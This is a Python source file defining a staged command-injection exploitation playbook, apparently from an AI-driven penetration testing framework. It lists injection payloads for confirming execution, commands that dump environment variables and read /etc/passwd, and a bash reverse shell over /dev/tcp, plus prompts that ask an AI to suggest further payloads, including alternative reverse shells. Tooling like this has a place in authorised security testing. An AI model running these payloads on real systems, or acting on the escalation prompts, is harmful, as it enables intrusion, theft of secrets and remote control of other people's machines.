from . import Playbook, ExploitStage, PayloadEntry

command_injection_playbook = Playbook(
    vuln_type="command_injection",
    description="Exploits OS Command Injection vulnerabilities.",
    stages=[
        ExploitStage(
            name="boundary_testing",
            description="Test simple sleep or echo commands to confirm execution safely.",
            payloads=[
                PayloadEntry("$(whoami)", "Command substitution."),
                PayloadEntry("; whoami", "Sequential command execution."),
                PayloadEntry("| whoami", "Piping command output."),
                PayloadEntry("`whoami`", "Backtick execution.")
            ],
            success_indicators=["root", "daemon", "www-data"],
            failure_indicators=["command not found", "invalid option"],
            next_stage_on_success="escalation",
            ai_escalation_prompt="Command injection confirmed. Suggest payloads to extract network information or read sensitive environment variables."
        ),
        ExploitStage(
            name="escalation",
            description="Extract environment or network configuration.",
            payloads=[
                PayloadEntry("; env", "List environment variables."),
                PayloadEntry("; cat /etc/passwd", "Read local files as the running user."),
                PayloadEntry("; ifconfig", "Extract network interface details.")
            ],
            success_indicators=["PATH=", "root:x:", "eth0", "lo"],
            failure_indicators=[],
            next_stage_on_success="reverse_shell_demo",
            ai_escalation_prompt="Suggest payloads to establish a reverse shell or execute a more complex script to prove critical impact."
        ),
        ExploitStage(
            name="reverse_shell_demo",
            description="Demonstrate reverse shell or out-of-band communication.",
            payloads=[
                PayloadEntry("; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1", "Classic bash reverse shell."),
                PayloadEntry("; curl http://localhost:8000/trigger", "Out-of-band trigger.")
            ],
            success_indicators=[],
            failure_indicators=[],
            next_stage_on_success=None,
            ai_escalation_prompt="Suggest alternative reverse shells if bash/tcp isn't available (e.g., Python, Perl, netcat)."
        )
    ]
)
